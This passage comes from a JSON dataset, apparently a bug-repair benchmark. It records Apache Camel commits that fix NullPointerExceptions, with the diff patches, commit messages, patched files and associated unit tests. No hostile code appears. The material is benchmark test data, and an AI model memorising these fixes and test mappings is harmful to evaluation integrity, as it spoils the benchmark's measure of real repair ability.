                "blob_url": "https://github.com/apache/camel/blob/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=efe77bbdd09e097752c6e9246c1e7cf7b0be73e0",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -662,7 +662,10 @@ protected static Object getContentFromCxf(Message message, DataFormat dataFormat\n             } else if (dataFormat.dealias() == DataFormat.RAW) {\n                 answer = message.getContent(InputStream.class);\n                 \n-            } else if (dataFormat.dealias() == DataFormat.CXF_MESSAGE) {\n+            } else if (dataFormat.dealias() == DataFormat.CXF_MESSAGE \n+                && message.getContent(List.class) != null) {\n+                // CAMEL-6404 added check point of message content\n+                // The message content of list could be null if there is a fault message is received\n                 answer = message.getContent(List.class).get(0);\n             }\n ",
                "raw_url": "https://github.com/apache/camel/raw/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "05129ec8cd476cbc08a3437c380e3690a753659f",
                "status": "modified"
            },
            {
                "additions": 60,
                "blob_url": "https://github.com/apache/camel/blob/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java",
                "changes": 60,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java?ref=efe77bbdd09e097752c6e9246c1e7cf7b0be73e0",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java",
                "patch": "@@ -0,0 +1,60 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.cxf;\n+\n+import javax.xml.ws.Endpoint;\n+\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.hello_world_soap_http.GreeterImpl;\n+import org.junit.AfterClass;\n+import org.junit.BeforeClass;\n+import org.springframework.context.support.ClassPathXmlApplicationContext;\n+\n+public class CxfGreeterCXFMessageRouterTest extends AbstractCXFGreeterRouterTest {\n+    protected static Endpoint endpoint;\n+    @AfterClass\n+    public static void stopService() {\n+        if (endpoint != null) {\n+            endpoint.stop();\n+        }\n+    }\n+\n+\n+    @BeforeClass\n+    public static void startService() {\n+        Object implementor = new GreeterImpl();\n+        String address = \"http://localhost:\" + getPort1() \n+            + \"/CxfGreeterCXFMessageRouterTest/SoapContext/SoapPort\";\n+        endpoint = Endpoint.publish(address, implementor); \n+    }\n+    \n+    \n+    @Override\n+    protected RouteBuilder createRouteBuilder() {\n+        return new RouteBuilder() {\n+            public void configure() {\n+                from(\"cxf:bean:routerEndpoint?dataFormat=CXF_MESSAGE&publishedEndpointUrl=http://www.simple.com/services/test\")\n+                    .to(\"cxf:bean:serviceEndpoint?dataFormat=CXF_MESSAGE\");\n+            }\n+        };\n+    }\n+    \n+    @Override\n+    protected ClassPathXmlApplicationContext createApplicationContext() {\n+        return new ClassPathXmlApplicationContext(\"org/apache/camel/component/cxf/GreeterEndpointCxfMessageBeans.xml\");\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageRouterTest.java",
                "sha": "0b7283a1d424e5bdfec31d43ab93e63a152bc17c",
                "status": "added"
            },
            {
                "additions": 48,
                "blob_url": "https://github.com/apache/camel/blob/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageBeans.xml",
                "changes": 48,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageBeans.xml?ref=efe77bbdd09e097752c6e9246c1e7cf7b0be73e0",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageBeans.xml",
                "patch": "@@ -0,0 +1,48 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<beans xmlns=\"http://www.springframework.org/schema/beans\"\n+       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+       xmlns:cxf=\"http://camel.apache.org/schema/cxf\"\n+\n+       xsi:schemaLocation=\"\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n+       http://camel.apache.org/schema/cxf http://camel.apache.org/schema/cxf/camel-cxf.xsd\n+       http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd\n+    \">\n+\n+    <bean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"/>\n+\n+   <import resource=\"classpath:META-INF/cxf/cxf.xml\"/>\n+   <!-- Added the import for testing the CAMEL-329 -->\n+\n+\n+   <cxf:cxfEndpoint id=\"routerEndpoint\" address=\"http://localhost:${CXFTestSupport.port2}/CxfGreeterCXFMessageRouterTest/CamelContext/RouterPort\"\n+    \t\tserviceClass=\"org.apache.hello_world_soap_http.GreeterImpl\"\n+    \t\tloggingFeatureEnabled=\"true\">\n+   </cxf:cxfEndpoint>\n+\n+   <cxf:cxfEndpoint id=\"serviceEndpoint\" address=\"http://localhost:${CXFTestSupport.port1}/CxfGreeterCXFMessageRouterTest/SoapContext/SoapPort\"\n+    \t\twsdlURL=\"testutils/hello_world.wsdl\"\n+    \t\tserviceClass=\"org.apache.hello_world_soap_http.Greeter\"\n+    \t\tendpointName=\"s:SoapPort\"\n+    \t\tserviceName=\"s:SOAPService\"\n+    \txmlns:s=\"http://apache.org/hello_world_soap_http\" >\n+    \t\n+   </cxf:cxfEndpoint>\n+\n+</beans>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageBeans.xml",
                "sha": "c36500b6251d81b36f8210a61262c4f945a0d4bd",
                "status": "added"
            }
        ],
        "message": "CAMEL-6404 Fixed the NPE issue when the dataformate is CXF_MESSAGE",
        "parent": "https://github.com/apache/camel/commit/c569bd95f3c2b8f13d52bc37a4c55ada10841e8f",
        "patched_files": [
            "GreeterEndpointCxfMessageBeans.java",
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfGreeterCXFMessageRouterTest.java",
            "DefaultCxfBindingTest.java"
        ]
    },
    "camel_f0b3821": {
        "bug_id": "camel_f0b3821",
        "commit": "https://github.com/apache/camel/commit/f0b3821a1ae00f976229dfd8e06cd87257deb067",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/f0b3821a1ae00f976229dfd8e06cd87257deb067/components/camel-osgi/src/main/java/org/apache/camel/osgi/OsgiFactoryFinder.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-osgi/src/main/java/org/apache/camel/osgi/OsgiFactoryFinder.java?ref=f0b3821a1ae00f976229dfd8e06cd87257deb067",
                "deletions": 1,
                "filename": "components/camel-osgi/src/main/java/org/apache/camel/osgi/OsgiFactoryFinder.java",
                "patch": "@@ -79,10 +79,18 @@ public Class findClass(String key, String propertyPrefix) throws ClassNotFoundEx\n        \n     public BundleEntry getResource(String name) {\n         BundleEntry entry = null;\n+        org.osgi.framework.Bundle[] bundles = null;       \n         BundleContext bundleContext = Activator.getBundle().getBundleContext();\n+        if (bundleContext == null) {\n+            // Bundle is not in STARTING|ACTIVE|STOPPING state\n+            // (See OSGi 4.1 spec, section 4.3.17)\n+            bundles = new org.osgi.framework.Bundle[] {Activator.getBundle()};\n+        } else {\n+            bundles = bundleContext.getBundles();\n+        }\n \n         URL url;\n-        for (Bundle bundle : bundleContext.getBundles()) {\n+        for (Bundle bundle : bundles) {\n             url = bundle.getEntry(getResourcePath() + name);\n             if (url != null) {\n                 entry = new BundleEntry();",
                "raw_url": "https://github.com/apache/camel/raw/f0b3821a1ae00f976229dfd8e06cd87257deb067/components/camel-osgi/src/main/java/org/apache/camel/osgi/OsgiFactoryFinder.java",
                "sha": "98d6f7796e8135ec55ccf74817dea42f6e4cca41",
                "status": "modified"
            }
        ],
        "message": "CAMEL-2020 fixed the NPE of the OsgiFactoryFinder\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@816105 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/0accc0d75c6c6174a16998633c6dc569bac01af0",
        "patched_files": [
            "OsgiFactoryFinder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "OsgiFactoryFinderTest.java"
        ]
    },
    "camel_f250626": {
        "bug_id": "camel_f250626",
        "commit": "https://github.com/apache/camel/commit/f25062607f0271bb99927eb6df02993ae8b579b7",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/f25062607f0271bb99927eb6df02993ae8b579b7/camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java?ref=f25062607f0271bb99927eb6df02993ae8b579b7",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java",
                "patch": "@@ -323,7 +323,12 @@ public boolean isFailed() {\n     }\n \n     public boolean isTransacted() {\n-        return getUnitOfWork() != null && getUnitOfWork().isTransacted();\n+        UnitOfWork uow = getUnitOfWork();\n+        if (uow != null) {\n+            return uow.isTransacted();\n+        } else {\n+            return false;\n+        }\n     }\n \n     public boolean isRollbackOnly() {",
                "raw_url": "https://github.com/apache/camel/raw/f25062607f0271bb99927eb6df02993ae8b579b7/camel-core/src/main/java/org/apache/camel/impl/DefaultExchange.java",
                "sha": "f7e53cfca2a9deeb8048eba9cdc379678d7d5247",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/f25062607f0271bb99927eb6df02993ae8b579b7/camel-core/src/main/java/org/apache/camel/processor/UnitOfWorkProcessor.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/UnitOfWorkProcessor.java?ref=f25062607f0271bb99927eb6df02993ae8b579b7",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/UnitOfWorkProcessor.java",
                "patch": "@@ -152,19 +152,23 @@ protected UnitOfWork createUnitOfWork(Exchange exchange) {\n     private void doneUow(UnitOfWork uow, Exchange exchange) {\n         // unit of work is done\n         try {\n-            if (exchange.getUnitOfWork() != null) {\n-                exchange.getUnitOfWork().done(exchange);\n+            if (uow != null) {\n+                uow.done(exchange);\n             }\n         } catch (Throwable e) {\n             LOG.warn(\"Exception occurred during done UnitOfWork for Exchange: \" + exchange\n                     + \". This exception will be ignored.\", e);\n         }\n         try {\n-            uow.stop();\n+            if (uow != null) {\n+                uow.stop();\n+            }\n         } catch (Throwable e) {\n             LOG.warn(\"Exception occurred during stopping UnitOfWork for Exchange: \" + exchange\n                     + \". This exception will be ignored.\", e);\n         }\n+\n+        // remove uow from exchange as its done\n         exchange.setUnitOfWork(null);\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/f25062607f0271bb99927eb6df02993ae8b579b7/camel-core/src/main/java/org/apache/camel/processor/UnitOfWorkProcessor.java",
                "sha": "e94eb487c018908e80712be5e02aca8bb14fc0f5",
                "status": "modified"
            },
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/f25062607f0271bb99927eb6df02993ae8b579b7/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultChannel.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultChannel.java?ref=f25062607f0271bb99927eb6df02993ae8b579b7",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultChannel.java",
                "patch": "@@ -35,6 +35,7 @@\n import org.apache.camel.spi.InterceptStrategy;\n import org.apache.camel.spi.LifecycleStrategy;\n import org.apache.camel.spi.RouteContext;\n+import org.apache.camel.spi.UnitOfWork;\n import org.apache.camel.support.ServiceSupport;\n import org.apache.camel.util.AsyncProcessorConverterHelper;\n import org.apache.camel.util.AsyncProcessorHelper;\n@@ -302,11 +303,17 @@ public boolean process(final Exchange exchange, final AsyncCallback callback) {\n         AsyncProcessor async = AsyncProcessorConverterHelper.convert(processor);\n         boolean sync = async.process(exchange, new AsyncCallback() {\n             public void done(boolean doneSync) {\n-                // pop the route context we just used\n-                if (exchange.getUnitOfWork() != null) {\n-                    exchange.getUnitOfWork().popRouteContext();\n+                try {\n+                    UnitOfWork uow = exchange.getUnitOfWork();\n+                    // pop the route context we just used\n+                    if (uow != null) {\n+                        uow.popRouteContext();\n+                    }\n+                } catch (Exception e) {\n+                    exchange.setException(e);\n+                } finally {\n+                    callback.done(doneSync);\n                 }\n-                callback.done(doneSync);\n             }\n         });\n ",
                "raw_url": "https://github.com/apache/camel/raw/f25062607f0271bb99927eb6df02993ae8b579b7/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultChannel.java",
                "sha": "e674f60478b5d274b1112f702cd0f76b0447eb3e",
                "status": "modified"
            }
        ],
        "message": "CAMEL-4447: Fixing potential NPE in access to UnitOfWork on Exchange.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1174245 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/0e4183046478e1ad4f97b168bec0ce3b6929b3dd",
        "patched_files": [
            "DefaultExchange.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultExchangeTest.java"
        ]
    },
    "camel_f2e425e": {
        "bug_id": "camel_f2e425e",
        "commit": "https://github.com/apache/camel/commit/f2e425e6a15035d3393310f232bcc3689a70eed1",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/f2e425e6a15035d3393310f232bcc3689a70eed1/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java?ref=f2e425e6a15035d3393310f232bcc3689a70eed1",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "patch": "@@ -176,8 +176,11 @@ public void process(Exchange camelExchange) throws Exception {\n             // add cookies to the cookie store\n             if (endpoint.getCookieHandler() != null) {\n                 try {\n-                    Map<String, List<String>> cxfHeaders = CastUtils.cast((Map<?, ?>)cxfExchange.getInMessage().get(Message.PROTOCOL_HEADERS));\n-                    endpoint.getCookieHandler().storeCookies(camelExchange, endpoint.getRequestUri(camelExchange), cxfHeaders);\n+                    Message inMessage = cxfExchange.getInMessage();\n+                    if (inMessage != null) {\n+                        Map<String, List<String>> cxfHeaders = CastUtils.cast((Map<?, ?>)inMessage.get(Message.PROTOCOL_HEADERS));\n+                        endpoint.getCookieHandler().storeCookies(camelExchange, endpoint.getRequestUri(camelExchange), cxfHeaders);\n+                    }\n                 } catch (IOException e) {\n                     LOG.error(\"Cannot store cookies\", e);\n                 }",
                "raw_url": "https://github.com/apache/camel/raw/f2e425e6a15035d3393310f232bcc3689a70eed1/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfProducer.java",
                "sha": "cf0e37b0eecbd31022fd449e171463430157908c",
                "status": "modified"
            },
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/f2e425e6a15035d3393310f232bcc3689a70eed1/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfProducerSessionTest.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfProducerSessionTest.java?ref=f2e425e6a15035d3393310f232bcc3689a70eed1",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfProducerSessionTest.java",
                "patch": "@@ -19,6 +19,7 @@\n import java.util.Collections;\n import java.util.Map;\n \n+import org.apache.camel.CamelExecutionException;\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.http.common.cookie.ExchangeCookieHandler;\n import org.apache.camel.http.common.cookie.InstanceCookieHandler;\n@@ -101,6 +102,18 @@ public void testInstanceSession() throws Exception {\n         assertMockEndpointsSatisfied();\n     }\n \n+    @Test(expected = IllegalArgumentException.class)\n+    public void testSessionWithInvalidPayload() throws Throwable {\n+        try {\n+            template.requestBody(\"direct:invalid\", \"World\", String.class);\n+        } catch (CamelExecutionException e) {\n+            if (e.getCause() != null) {\n+                throw e.getCause();\n+            }\n+            throw e;\n+        }\n+    }\n+\n     protected RouteBuilder createRouteBuilder() {\n         return new RouteBuilder() {\n             public void configure() {\n@@ -128,6 +141,8 @@ public void configure() {\n                     .to(url + \"&cookieHandler=#exchangeCookieHandler\")\n                     .setBody().xpath(PARAMETER_XPATH, String.class, NAMESPACES)\n                     .to(\"mock:result\");\n+                from(\"direct:invalid\")\n+                    .to(url + \"&cookieHandler=#exchangeCookieHandler\");\n             }\n         };\n     }",
                "raw_url": "https://github.com/apache/camel/raw/f2e425e6a15035d3393310f232bcc3689a70eed1/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfProducerSessionTest.java",
                "sha": "104194b550fcc7262c27804cfe7fd0bb2f1afe82",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11486: NullPointerException for invalid payload with session handling enabled",
        "parent": "https://github.com/apache/camel/commit/1c86ed71607ee48d7d2726278232905857d0c4f5",
        "patched_files": [
            "CxfProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfProducerSessionTest.java",
            "CxfProducerTest.java"
        ]
    },
    "camel_f43c535": {
        "bug_id": "camel_f43c535",
        "commit": "https://github.com/apache/camel/commit/f43c5359c64992c7f2dc011e38bb799f7a2a7f69",
        "file": [
            {
                "additions": 17,
                "blob_url": "https://github.com/apache/camel/blob/f43c5359c64992c7f2dc011e38bb799f7a2a7f69/components/camel-atmosphere-websocket/src/main/java/org/apache/camel/component/atmosphere/websocket/WebsocketProducer.java",
                "changes": 32,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-atmosphere-websocket/src/main/java/org/apache/camel/component/atmosphere/websocket/WebsocketProducer.java?ref=f43c5359c64992c7f2dc011e38bb799f7a2a7f69",
                "deletions": 15,
                "filename": "components/camel-atmosphere-websocket/src/main/java/org/apache/camel/component/atmosphere/websocket/WebsocketProducer.java",
                "patch": "@@ -112,23 +112,25 @@ private void messageDistributor(final List<String> connectionKeyList, final Obje\n     }\n \n     private void sendMessage(final WebSocket websocket, final Object message) {\n-        executor.execute(new Runnable() {\n-            @Override\n-            public void run() {\n-                try {\n-                    if (message instanceof String) {\n-                        websocket.write((String) message);\n-                    } else if (message instanceof byte[]) {\n-                        websocket.write((byte[]) message, 0, ((byte[]) message).length);\n-                    } else {\n-                        // this should not happen unless one of the supported types is missing above.\n-                        LOG.error(\"unexpected message type {}\", message == null ? null : message.getClass());\n+        if (websocket != null && message != null) {\n+            executor.execute(new Runnable() {\n+                @Override\n+                public void run() {\n+                    try {\n+                        if (message instanceof String) {\n+                            websocket.write((String) message);\n+                        } else if (message instanceof byte[]) {\n+                            websocket.write((byte[]) message, 0, ((byte[]) message).length);\n+                        } else {\n+                            // this should not happen unless one of the supported types is missing above.\n+                            LOG.error(\"unexpected message type {}\", message == null ? null : message.getClass());\n+                        }\n+                    } catch (Exception e) {\n+                        LOG.error(\"Error when writing to websocket\", e);\n                     }\n-                } catch (Exception e) {\n-                    LOG.error(\"Error when writing to websocket\", e);\n                 }\n-            }\n-        });\n+            });\n+        }\n     }\n \n     private WebSocket getWebSocket(final String connectionKey) {",
                "raw_url": "https://github.com/apache/camel/raw/f43c5359c64992c7f2dc011e38bb799f7a2a7f69/components/camel-atmosphere-websocket/src/main/java/org/apache/camel/component/atmosphere/websocket/WebsocketProducer.java",
                "sha": "70a6c0fe12c03f54cf2c6620ef827bba72f5d277",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-9398] NullPointerException when connectionKey is not valid",
        "parent": "https://github.com/apache/camel/commit/5c6fd52587ba97410319a89b9d1a40548dfd4379",
        "patched_files": [
            "WebsocketProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "WebsocketProducerTest.java"
        ]
    },
    "camel_f7f3a44": {
        "bug_id": "camel_f7f3a44",
        "commit": "https://github.com/apache/camel/commit/f7f3a442738221300f707ae5dc8b9323706d083e",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/f7f3a442738221300f707ae5dc8b9323706d083e/camel-core/src/main/java/org/apache/camel/impl/DefaultComponentResolver.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultComponentResolver.java?ref=f7f3a442738221300f707ae5dc8b9323706d083e",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultComponentResolver.java",
                "patch": "@@ -61,12 +61,12 @@ public Component resolveComponent(String name, CamelContext context) {\n         } catch (Throwable e) {\n             throw new IllegalArgumentException(\"Invalid URI, no Component registered for scheme: \" + name, e);\n         }\n-        if (LOG.isDebugEnabled()) {\n-            LOG.debug(\"Found component: \" + name + \" via type: \" + type.getName() + \" via: \" + COMPONENT_FACTORY.getPath() + name);\n-        }\n         if (type == null) {\n             return null;\n         }\n+        if (LOG.isDebugEnabled()) {\n+            LOG.debug(\"Found component: \" + name + \" via type: \" + type.getName() + \" via: \" + COMPONENT_FACTORY.getPath() + name);\n+        }\n         if (Component.class.isAssignableFrom(type)) {\n             return (Component) context.getInjector().newInstance(type);\n         } else {",
                "raw_url": "https://github.com/apache/camel/raw/f7f3a442738221300f707ae5dc8b9323706d083e/camel-core/src/main/java/org/apache/camel/impl/DefaultComponentResolver.java",
                "sha": "b39b75d661d3dbd95ded4360cb3fe65c4951d5eb",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/f7f3a442738221300f707ae5dc8b9323706d083e/camel-core/src/main/java/org/apache/camel/util/FactoryFinder.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/FactoryFinder.java?ref=f7f3a442738221300f707ae5dc8b9323706d083e",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/FactoryFinder.java",
                "patch": "@@ -106,7 +106,9 @@ public Class findClass(String key, String propertyPrefix) throws ClassNotFoundEx\n         Class clazz = classMap.get(propertyPrefix + key);\n         if (clazz == null) {\n             clazz = newInstance(doFindFactoryProperties(key), propertyPrefix);\n-            classMap.put(propertyPrefix + key, clazz);\n+            if (clazz != null) {\n+                classMap.put(propertyPrefix + key, clazz);\n+            }\n         }\n         return clazz;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/f7f3a442738221300f707ae5dc8b9323706d083e/camel-core/src/main/java/org/apache/camel/util/FactoryFinder.java",
                "sha": "52a5e8061f8c96e98414bb36597fe46373b7426b",
                "status": "modified"
            },
            {
                "additions": 52,
                "blob_url": "https://github.com/apache/camel/blob/f7f3a442738221300f707ae5dc8b9323706d083e/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "changes": 77,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java?ref=f7f3a442738221300f707ae5dc8b9323706d083e",
                "deletions": 25,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "patch": "@@ -41,7 +41,7 @@\n \n /**\n  * A number of useful helper methods for working with Objects\n- * \n+ *\n  * @version $Revision$\n  */\n public final class ObjectHelper {\n@@ -260,7 +260,7 @@ public static boolean isNotEmpty(Object value) {\n     /**\n      * Removes any starting characters on the given text which match the given\n      * character\n-     * \n+     *\n      * @param text the string\n      * @param ch the initial characters to remove\n      * @return either the original string or the new substring\n@@ -364,7 +364,7 @@ public void remove() {\n      * Returns the predicate matching boolean on a {@link List} result set where\n      * if the first element is a boolean its value is used otherwise this method\n      * returns true if the collection is not empty\n-     * \n+     *\n      * @return <tt>true</tt> if the first element is a boolean and its value\n      *         is true or if the list is non empty\n      */\n@@ -385,7 +385,7 @@ public static boolean matches(List list) {\n     /**\n      * A helper method to access a system property, catching any security\n      * exceptions\n-     * \n+     *\n      * @param name the name of the system property required\n      * @param defaultValue the default value to use if the property is not\n      *                available or a security exception prevents access\n@@ -407,7 +407,7 @@ public static String getSystemProperty(String name, String defaultValue) {\n     /**\n      * A helper method to access a boolean system property, catching any\n      * security exceptions\n-     * \n+     *\n      * @param name the name of the system property required\n      * @param defaultValue the default value to use if the property is not\n      *                available or a security exception prevents access\n@@ -449,7 +449,7 @@ public static String classCanonicalName(Object value) {\n     /**\n      * Attempts to load the given class name using the thread context class\n      * loader or the class loader used to load this class\n-     * \n+     *\n      * @param name the name of the class to load\n      * @return the class or null if it could not be loaded\n      */\n@@ -460,32 +460,59 @@ public static String classCanonicalName(Object value) {\n     /**\n      * Attempts to load the given class name using the thread context class\n      * loader or the given class loader\n-     * \n+     *\n      * @param name the name of the class to load\n      * @param loader the class loader to use after the thread context class\n      *                loader\n      * @return the class or null if it could not be loaded\n      */\n     public static Class<?> loadClass(String name, ClassLoader loader) {\n-        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n-        if (contextClassLoader != null) {\n-            try {\n-                return contextClassLoader.loadClass(name);\n-            } catch (ClassNotFoundException e) {\n-                try {\n-                    return loader.loadClass(name);\n-                } catch (ClassNotFoundException e1) {\n-                    LOG.debug(\"Could not find class: \" + name + \". Reason: \" + e);\n-                }\n+        // try context class loader first\n+        Class clazz = doLoadClass(name, Thread.currentThread().getContextClassLoader());\n+        if (clazz == null) {\n+            // then the provided loader\n+            clazz = doLoadClass(name, loader);\n+        }\n+        if (clazz == null) {\n+            // and fallback to the loader the loaded the ObjectHelper class\n+            clazz = doLoadClass(name, ObjectHelper.class.getClassLoader());\n+        }\n+\n+        if (clazz == null) {\n+            LOG.warn(\"Could not find class: \" + name);\n+        }\n+\n+        return clazz;\n+    }\n+\n+    /**\n+     * Loads the given class with the provided classloader (may be null).\n+     * Will ignore any class not found and return null.\n+     *\n+     * @param name    the name of the class to load\n+     * @param loader  a provided loader (may be null)\n+     * @return the class, or null if it could not be loaded\n+     */\n+    private static Class<?> doLoadClass(String name, ClassLoader loader) {\n+        ObjectHelper.notEmpty(name, \"name\");\n+        if (loader == null) {\n+            return null;\n+        }\n+        try {\n+            return loader.loadClass(name);\n+        } catch (ClassNotFoundException e) {\n+            if (LOG.isTraceEnabled()) {\n+                LOG.trace(\"Can not load class: \" + name + \" using classloader: \" + loader, e);\n             }\n+\n         }\n         return null;\n     }\n \n     /**\n      * Attempts to load the given resource as a stream using the thread context\n      * class loader or the class loader used to load this class\n-     * \n+     *\n      * @param name the name of the resource to load\n      * @return the stream or null if it could not be loaded\n      */\n@@ -506,7 +533,7 @@ public static InputStream loadResourceAsStream(String name) {\n     /**\n      * A helper method to invoke a method via reflection and wrap any exceptions\n      * as {@link RuntimeCamelException} instances\n-     * \n+     *\n      * @param method the method to invoke\n      * @param instance the object instance (or null for static methods)\n      * @param parameters the parameters to the method\n@@ -524,7 +551,7 @@ public static Object invokeMethod(Method method, Object instance, Object... para\n \n     /**\n      * Returns a list of methods which are annotated with the given annotation\n-     * \n+     *\n      * @param type the type to reflect on\n      * @param annotationType the annotation type\n      * @return a list of the methods found\n@@ -536,7 +563,7 @@ public static Object invokeMethod(Method method, Object instance, Object... para\n \n     /**\n      * Returns a list of methods which are annotated with the given annotation\n-     * \n+     *\n      * @param type the type to reflect on\n      * @param annotationType the annotation type\n      * @param checkMetaAnnotations check for meta annotations\n@@ -560,7 +587,7 @@ public static Object invokeMethod(Method method, Object instance, Object... para\n \n     /**\n      * Checks if a Class or Method are annotated with the given annotation\n-     * \n+     *\n      * @param elem the Class or Method to reflect on\n      * 